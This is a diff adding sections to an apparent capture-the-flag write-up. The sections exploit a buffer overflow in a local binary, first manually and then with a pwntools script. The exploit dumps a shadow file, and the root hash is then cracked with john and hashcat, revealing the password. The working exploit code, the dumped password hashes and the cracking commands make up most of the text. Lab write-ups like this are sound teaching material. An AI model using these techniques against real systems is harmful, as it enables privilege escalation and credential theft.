@@ -500,19 +500,451 @@ Perfect! Now that you got the Segmentation fault with the input of 50 "A"s, it m
 
 
 
+<details>
+  <summary>Binary-Exploitaion: Manually⭕</summary>
+
+
+## 6. Finding the `shell` Function Address
+
+Now that we know the offset is 44 bytes, we need to find the memory address of the `shell` function. This address will be the new value for the EIP.
+
+Inside GDB, we can use the `disassemble` command to inspect the function and find its starting address.
+
+**Command:**
+```gdb
+disassemble shell
+```
+
+**Output:**
+```asm
+Dump of assembler code for function shell:
+   0x080484cb <+0>:     push   ebp
+   0x080484cc <+1>:     mov    ebp,esp
+   0x080484ce <+3>:     sub    esp,0x8
+   0x080484d1 <+6>:     mov    DWORD PTR [esp],0x3e8
+   0x080484d8 <+13>:    call   0x8048380 <setuid@plt>
+   0x080484dd <+18>:    mov    DWORD PTR [esp],0x3e8
+   0x080484e4 <+25>:    call   0x8048350 <setgid@plt>
+   0x080484e9 <+30>:    mov    DWORD PTR [esp],0x80485a0
+   0x080484f0 <+37>:    call   0x8048340 <system@plt>
+   0x080484f5 <+42>:    leave  
+   0x080484f6 <+43>:    ret    
+End of assembler dump.
+```
+
+The address we are interested in is the very first one: `0x080484cb`. This is where the `shell` function begins.
+
+## 7. Crafting the Exploit Payload
+
+Our final payload will consist of:
+1.  **44 bytes** of padding to fill the buffer and reach the EIP.
+2.  The **memory address** of our `shell` function (`0x080484cb`) to overwrite the EIP.
+
+### A Note on Little-Endian Architecture
+
+Modern CPU architectures are typically "little-endian," which means the order of bytes is reversed. For our exploit to work, we must provide the memory address in little-endian format.
+
+-   **Original Address:** `0x080484cb`
+-   **Little-Endian Format:** `\xcb\x84\x04\x08`
+
+### Payload Generation with Python
+
+We can use a simple Python one-liner to generate and print the payload.
+
+#### Method 1: Manual Conversion
+This method involves manually reversing the bytes of the address.
+
+```sh
+python -c 'print "A"*44 + "\xcb\x84\x04\x08"'
+```
+
+#### Method 2: Using `struct.pack`
+This is the recommended method as it handles the little-endian conversion for us automatically. `struct.pack("<I", ...)` packs an unsigned integer (`I`) into little-endian (`<`) format.
+
+```sh
+python -c 'import struct; print "A"*44 + struct.pack("<I", 0x080484cb)'
+```
+Both commands produce the same output: 44 "A" characters followed by the memory address in the correct byte order.
+
+## 8. Executing the Exploit
+
+Finally, we pipe the output of our Python script directly into the vulnerable program.
+
+```sh
+python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
+```
+
+If successful, the `shell` function will execute, and you will see the contents of the backup shadow file:
+
+**Expected Output:**
+```
+[Contents of /var/backups/shadow.bak will be displayed here]
+```
+
+This completes the exploit, successfully redirecting the program's execution to run our desired code.
+
+
+---
+---
+
+![image](https://github.com/user-attachments/assets/b48d571b-ada8-429f-a3e1-d85a98b8d8b0)
+
+
+```
+root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
+```
+
+Save to a file ``shadow.hashes``:
+
+```
+root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:::
+```
+
+```
+john shadow.hashes --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+![image](https://github.com/user-attachments/assets/9014ad82-51ae-4436-abdb-b9c7b7c5a8eb)
+
+```
+love2fish
+```
+
+  
+</details>
 
 
 
 
 
+<details>
+  <summary>Binary Exploitation: The pwntools way⭕</summary>
+
+
+## 9. Automating the Exploit with Pwntools
+
+While the manual method works, it can be tedious. `pwntools` is a powerful Python library specifically designed for exploit development that simplifies this entire process.
+
+This section will build the final exploit script step-by-step.
+
+### Step 1: Setting up the Process
+
+First, we import the library and start the target process. This gives us a process object (`proc`) that we can interact with programmatically.
+
+```python
+from pwn import *
+
+# Start the target process
+proc = process('/opt/secret/root')
+```
+
+### Step 2: Finding the Function Address with ELF
+
+Instead of using GDB to find the `shell` function's address, `pwntools` can parse the binary file directly using its `ELF` functionality. This lets us retrieve the addresses of symbols, like functions, by name.
+
+```python
+from pwn import *
+
+proc = process('/opt/secret/root')
+
+# Load the binary into an ELF object to analyze it
+elf = ELF('/opt/secret/root')
+
+# Automatically find the address of the 'shell' function
+shell_func = elf.symbols.shell
+```
+The `shell_func` variable now holds the memory address of our target function (e.g., `0x080484cb`).
+
+### Step 3: Building and Sending the Payload
+
+`pwntools` provides a convenient function called `fit()` to build the payload. We tell it the offset and what to place there. It automatically handles the little-endian conversion.
+
+-   `proc.sendline()` sends our completed payload to the process.
+-   `proc.interactive()` passes control over to us, allowing us to see the output from the shell command.
+
+### Final Exploit Script
+
+Combining all the pieces gives us our final, automated exploit script.
+
+**exploit.py:**
+```python
+from pwn import *
+
+# 1. Start the process
+proc = process('/opt/secret/root')
+
+# 2. Analyze the binary to find the 'shell' function address
+elf = ELF('/opt/secret/root')
+shell_func = elf.symbols.shell
+
+# 3. Craft the payload
+#    - fit() automatically adds padding
+#    - It places the shell_func address at offset 44
+#    - It handles little-endian conversion automatically
+payload = fit({
+    44: shell_func 
+})
+
+# 4. Send the payload
+proc.sendline(payload)
+
+# 5. Switch to interactive mode to see the output
+proc.interactive()
+```
+
+### Running the Script
+
+Save the code above to a file (e.g., `exploit.py`) and run it from your terminal:
+
+```sh
+python exploit.py
+```
+
+**Expected Output:**
+Running the script will start the process, send the exploit, and then present you with the interactive output, which will show the contents of the backup shadow file retrieved by the `shell` function.
+
+```
+[+] Starting local process '/opt/secret/root': pid 12345
+[*] Switching to interactive mode
+[Contents of /var/backups/shadow.bak will be displayed here]
+$ 
+```
+This demonstrates how `pwntools` can significantly streamline the exploit development process.
+
+
+
+
+---
+
+
+make file ``exploit.py``
+
+```
+from pwn import *
+
+# Start the vulnerable binary as a process
+proc = process('/opt/secret/root')
+
+# Load the binary as an ELF so we can access symbols (like the address of 'shell')
+elf = ELF('/opt/secret/root')
+
+# Get the address of the shell function
+shell_func = elf.symbols.shell
+
+# Build the payload: 44 bytes of padding + address of shell function
+payload = fit({
+    44: shell_func
+})
+
+# Send the payload
+proc.sendline(payload)
+
+# Interact with the process (get the output)
+proc.interactive()
+
+```
+
+
+```
+python exploit.py
+```
+
+```
+[+] Starting local process '/opt/secret/root': pid 1663
+[DEBUG] PLT 0x8048370 setgid
+[DEBUG] PLT 0x8048380 system
+[DEBUG] PLT 0x8048390 __libc_start_main
+[DEBUG] PLT 0x80483a0 setuid
+[DEBUG] PLT 0x80483b0 __isoc99_scanf
+[DEBUG] PLT 0x80483c0 __gmon_start__
+[*] '/opt/secret/root'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+[DEBUG] Sent 0x31 bytes:
+    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
+    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
+    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  cb 84 04 08  │iaaa│jaaa│kaaa│····│
+    00000030  0a                                                  │·│
+    00000031
+[*] Switching to interactive mode
+[*] Process '/opt/secret/root' stopped with exit code -11 (SIGSEGV) (pid 1663)
+[DEBUG] Received 0x37f bytes:
+    'root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::\n'
+    'daemon:*:17953:0:99999:7:::\n'
+    'bin:*:17953:0:99999:7:::\n'
+    'sys:*:17953:0:99999:7:::\n'
+    'sync:*:17953:0:99999:7:::\n'
+    'games:*:17953:0:99999:7:::\n'
+    'man:*:17953:0:99999:7:::\n'
+    'lp:*:17953:0:99999:7:::\n'
+    'mail:*:17953:0:99999:7:::\n'
+    'news:*:17953:0:99999:7:::\n'
+    'uucp:*:17953:0:99999:7:::\n'
+    'proxy:*:17953:0:99999:7:::\n'
+    'www-data:*:17953:0:99999:7:::\n'
+    'backup:*:17953:0:99999:7:::\n'
+    'list:*:17953:0:99999:7:::\n'
+    'irc:*:17953:0:99999:7:::\n'
+    'gnats:*:17953:0:99999:7:::\n'
+    'nobody:*:17953:0:99999:7:::\n'
+    'systemd-timesync:*:17953:0:99999:7:::\n'
+    'systemd-network:*:17953:0:99999:7:::\n'
+    'systemd-resolve:*:17953:0:99999:7:::\n'
+    'systemd-bus-proxy:*:17953:0:99999:7:::\n'
+    'syslog:*:17953:0:99999:7:::\n'
+    '_apt:*:17953:0:99999:7:::\n'
+    'messagebus:*:18277:0:99999:7:::\n'
+    'uuidd:*:18277:0:99999:7:::\n'
+    'papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::\n'
+root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18277:0:99999:7:::
+uuidd:*:18277:0:99999:7:::
+papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
+```
+
+```
+root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
+```
+
+
+
+
+  
+</details>
 
 
 
 
 
+<details>
+  <summary>Finishing the job</summary>
+
+
+## 10. Cracking the Root Password Hash
+
+Now that we have retrieved the password hash, the final step is to crack it to reveal the root password.
+
+### The Hash
+From the previous steps, we obtained the root user's password hash:
+```
+$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.
+```
+
+### Recommended Tool: Hashcat
+`Hashcat` is a powerful and versatile password recovery tool. It uses your GPU (or CPU) to rapidly guess passwords from a wordlist against the given hash.
+
+### Preparing for the Crack
+
+**1. Identify the Hash Type:**
+The prefix `$6$` indicates that this is a `sha512crypt` hash, which is a common format for modern Linux systems. According to the [Hashcat example hashes list](https://hashcat.net/wiki/doku.php?id=example_hashes), the mode for `sha512crypt` is **1800**.
+
+**2. Get a Wordlist:**
+We will use `rockyou.txt`, a popular and effective wordlist containing millions of passwords from a previous data breach. If you don't have it, you can download it from various sources online. On systems like Kali Linux, it's often located at `/usr/share/wordlists/rockyou.txt.gz` (you may need to decompress it first).
+
+**3. Save the Hash to a File:**
+Copy the hash string and save it into a new text file named `hash.txt`.
+
+### Hashcat Command and Flags
+The basic syntax for Hashcat is:
+```sh
+hashcat {flags} {hashfile} {wordlist}
+```
+We will use the following flags:
+* `-a 0`: Specifies the attack mode. Mode `0` is a "Straight" or dictionary attack, which is what we want.
+* `-m 1800`: Specifies the hash type mode, which we identified as `sha512crypt`.
+
+### Putting It All Together
+With the hash saved in `hash.txt` and `rockyou.txt` ready, the final command is:
+```sh
+hashcat -a 0 -m 1800 hash.txt /path/to/your/rockyou.txt
+```
+*(Remember to replace `/path/to/your/rockyou.txt` with the actual path to your wordlist file.)*
+
+### Cracking Process and Result
+Hashcat will now start. It will iterate through every password in `rockyou.txt`, hash it using `sha512crypt`, and compare it to the hash in your file.
+
+If successful, Hashcat will stop and display the cracked password in the following format:
+```
+$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:crackedpassword
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: sha512crypt, SHA512 (Unix)
+Hash.Target......: $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q...
+Time.Started.....: ...
+Time.Estimated...: ...
+Guess.Base.......: File (/path/to/your/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#*.........: ...
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: ...
+Rejected.........: ...
+Restore.Point....: ...
+Candidates.#*....: ...
+HWMon.GPU.#1.....: Temp: 60c Util: 98% Core:1800MHz Mem:6000MHz Bus:16
+```
+
+The plain-text password will be displayed after the full hash string. You now have the root password!
+
+
+---
+---
+--
+
+```
+echo '$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.' > hashes.txt
+```
+
+```
+hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+```
 
 
 
+
+
+---
+
+> [!warning]
+> 
+> using john ripper
+
+![image](https://github.com/user-attachments/assets/1925674e-aa1d-4453-8279-48120c6d6b6f)
+
+
+```
+love2fish
+```
+
+  
+</details>
 
 
 
